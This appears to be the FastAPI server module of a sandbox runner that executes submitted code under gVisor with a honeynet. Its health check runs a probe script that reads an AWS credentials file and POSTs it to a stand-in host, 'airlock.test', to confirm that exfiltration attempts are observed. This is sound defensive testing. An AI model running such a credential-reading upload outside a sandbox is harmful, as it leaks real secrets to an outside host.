import asyncio
import base64
import json
import shutil
import time
import uuid
from pathlib import Path

from fastapi import Depends, FastAPI, Header, HTTPException
from fastapi.responses import JSONResponse, PlainTextResponse, StreamingResponse

from .config import settings
from .executor import SandboxExecutor
from .models import FileSpec, HealthResponse, LimitsSpec, NetworkSpec, RunManifest


app = FastAPI(title="Airlock Sandbox Runner API", version="1.0.0")
RUNS: dict[str, SandboxExecutor] = {}
SUMMARIES: dict[str, dict] = {}
TASKS: dict[str, asyncio.Task] = {}
_health_lock = asyncio.Lock()
_health: dict = {"ok": False, "observer_verified": False}
_health_at = 0.0


def verify_bearer_token(authorization: str | None = Header(None)):
    if not settings.RUNNER_TOKEN:
        raise HTTPException(503, "Runner authentication is not configured")
    expected = f"Bearer {settings.RUNNER_TOKEN}"
    import hmac

    if not authorization or not hmac.compare_digest(authorization, expected):
        raise HTTPException(403, "Invalid runner authorization")


async def runtime_health() -> dict:
    global _health, _health_at
    async with _health_lock:
        if _health_at and time.monotonic() - _health_at < 60:
            return _health
        source = "import subprocess,urllib.request\nbody=open('/home/user/.aws/credentials','rb').read()\nsubprocess.run(['/bin/true'],check=True)\nrequest=urllib.request.Request('http://airlock.test/health-probe',data=body,method='POST')\nassert urllib.request.urlopen(request,timeout=3).status==200\n"
        manifest = RunManifest(
            run_id=f"probe_{uuid.uuid4().hex}",
            entrypoint=["python3", "work/probe.py"],
            files=[
                FileSpec(
                    path="work/probe.py",
                    content_b64=base64.b64encode(source.encode()).decode(),
                )
            ],
            limits=LimitsSpec(timeout_s=8),
            network=NetworkSpec(mode="honeynet"),
        )
        executor = SandboxExecutor(manifest)
        result = await executor.execute()
        events = executor.observer.events
        honeynet_verified = (
            any(
                event["kind"] == "net"
                and event["observer"] == "sink"
                and event["detail"].get("op") == "dns"
                for event in events
            )
            and any(
                event["kind"] == "net"
                and event["detail"].get("http", {}).get("method") == "POST"
                for event in events
            )
            and any(
                event["kind"] == "canary"
                and event["observer"] == "sink"
                and event["detail"].get("trigger") == "exfil_attempt"
                for event in events
            )
        )
        verified = (
            honeynet_verified
            and result["observation_complete"]
            and result["outcome"] == "completed"
            and any(event["kind"] == "file" for event in events)
            and any(
                event["kind"] == "proc" and event["detail"].get("argv") == ["/bin/true"]
                for event in events
            )
        )
        _health = HealthResponse(
            ok=bool(verified and settings.RUNNER_TOKEN),
            observer_verified=verified,
            honeynet_verified=honeynet_verified,
            runtime="runsc" if verified else None,
            observer="gvisor" if verified else None,
            image_digest=result["image_digest"] or None,
            error=(
                "Runner authentication is not configured"
                if not settings.RUNNER_TOKEN
                else None
                if verified
                else "Runtime or Honeynet observation probe failed"
            ),
        ).model_dump()
        _health_at = time.monotonic()
        if Path(executor.run_dir).exists():
            shutil.rmtree(executor.run_dir)
        return _health


@app.get("/healthz")
async def healthz(authorization: str | None = Header(None)):
    if authorization is not None:
        verify_bearer_token(authorization)
    state = await runtime_health()
    return JSONResponse(state, status_code=200 if state["ok"] else 503)


@app.post("/v1/runs", status_code=202, dependencies=[Depends(verify_bearer_token)])
async def start_run(manifest: RunManifest):
    if manifest.run_id in RUNS:
        raise HTTPException(409, "Run already exists")
    if len([task for task in TASKS.values() if not task.done()]) >= 4:
        raise HTTPException(429, "Runner concurrency limit reached")
    executor = SandboxExecutor(manifest)
    try:
        executor.validate_manifest()
    except ValueError as error:
        raise HTTPException(400, str(error)) from None
    health = await runtime_health()
    if not health["ok"]:
        raise HTTPException(503, "Verified gVisor observer is unavailable")
    if manifest.run_id in RUNS:
        raise HTTPException(409, "Run already exists")
    if len([task for task in TASKS.values() if not task.done()]) >= 4:
        raise HTTPException(429, "Runner concurrency limit reached")
    if len(RUNS) >= 32:
        raise HTTPException(
            503,
            "Retained run budget reached; delete completed runs before submitting more",
        )
    RUNS[manifest.run_id] = executor

    async def run_task():
        SUMMARIES[manifest.run_id] = await executor.execute()

    TASKS[manifest.run_id] = asyncio.create_task(run_task())
    return {"run_id": manifest.run_id}


@app.get("/v1/runs/{run_id}/events", dependencies=[Depends(verify_bearer_token)])
async def stream_events(run_id: str, after_seq: int = 0):
    executor = RUNS.get(run_id)
    if executor is None:
        raise HTTPException(404, "Run not found")

    async def generate():
        cursor = after_seq
        while True:
            for event in executor.observer.get_events(cursor):
                cursor = event["seq"]
                yield f"data: {json.dumps(event)}\n\n"
                if event["kind"] == "stage" and event["detail"].get("state") == "end":
                    return
            if run_id in SUMMARIES:
                return
            yield ": heartbeat\n\n"
            await asyncio.sleep(0.1)

    return StreamingResponse(
        generate(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache"},
    )


@app.get("/v1/runs/{run_id}/summary", dependencies=[Depends(verify_bearer_token)])
async def get_summary(run_id: str):
    if run_id in SUMMARIES:
        return SUMMARIES[run_id]
    raise HTTPException(409 if run_id in RUNS else 404, "Summary is not ready")


@app.get(
    "/v1/runs/{run_id}/artifacts/{name}", dependencies=[Depends(verify_bearer_token)]
)
async def get_artifact(run_id: str, name: str):
    executor = RUNS.get(run_id)
    if executor is None or name not in {"stdout.txt", "stderr.txt"}:
        raise HTTPException(404, "Artifact not found")
    path = Path(executor.artifacts_dir) / name
    if not path.is_file():
        raise HTTPException(404, "Artifact not ready")
    return PlainTextResponse(path.read_text(errors="replace"))


@app.post("/v1/runs/{run_id}/kill", dependencies=[Depends(verify_bearer_token)])
async def kill_run(run_id: str):
    if run_id not in RUNS:
        raise HTTPException(404, "Run not found")
    RUNS[run_id].kill()
    task = TASKS.get(run_id)
    if task and not task.done():
        await asyncio.wait_for(asyncio.shield(task), 20)
    executor = RUNS[run_id]
    if any((executor.container_id, executor.sink_id, executor.network_id)):
        try:
            await executor.cleanup()
        except RuntimeError:
            raise HTTPException(503, "Runtime cleanup was not confirmed") from None
    return {"ok": True, "killed": run_id}


@app.delete("/v1/runs/{run_id}", dependencies=[Depends(verify_bearer_token)])
async def delete_run(run_id: str):
    if run_id in RUNS:
        await kill_run(run_id)
        executor = RUNS.pop(run_id)
        path = Path(executor.run_dir)
        if path.exists():
            shutil.rmtree(path)
    TASKS.pop(run_id, None)
    SUMMARIES.pop(run_id, None)
    return {"ok": True, "deleted": run_id}
